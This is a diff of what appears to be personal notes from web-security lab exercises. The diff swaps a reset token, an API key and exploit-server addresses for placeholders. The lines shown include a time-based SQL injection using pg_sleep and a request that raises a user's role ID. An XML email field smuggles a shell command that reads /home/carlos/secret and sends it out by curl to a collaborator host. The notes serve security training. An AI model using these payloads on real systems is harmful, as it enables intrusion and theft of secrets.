@@ -61,7 +61,7 @@ GET /search_advanced?find=';SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sle
 >password refresh reset  
 
 ```
-/refreshpassword?temp-forgot-password-token=DdwYXbFEN8ncNktdx2y0OjAKgzghNVoa
+/refreshpassword?temp-forgot-password-token=YESYESYESYESYESYESEYSE
 ```  
 
 ## 2 - 2  
@@ -77,8 +77,8 @@ Content-Length: 173
 
 {
   "username": "carlos",
-  "email": "attacker@exploit-0a8a003603011b95c11d5cda01420001.exploit-server.net",
-  "apikey": "ZrObR96W6DppZKNGphkBHWMMAtZBZC5Y",
+  "email": "attacker@exploit.net",
+  "apikey": "YESYESYESYESYESYESYESYES",
   "roleid": 47
 }
 ```
@@ -97,7 +97,7 @@ Content-Type: text/xml
 <users>
     <user>
         <username>Jacky22</username>
-        <email>james22@exploit-123.exploit-server.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
+        <email>james22@exploit.net||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||</email>
     </user>
 </users>
 
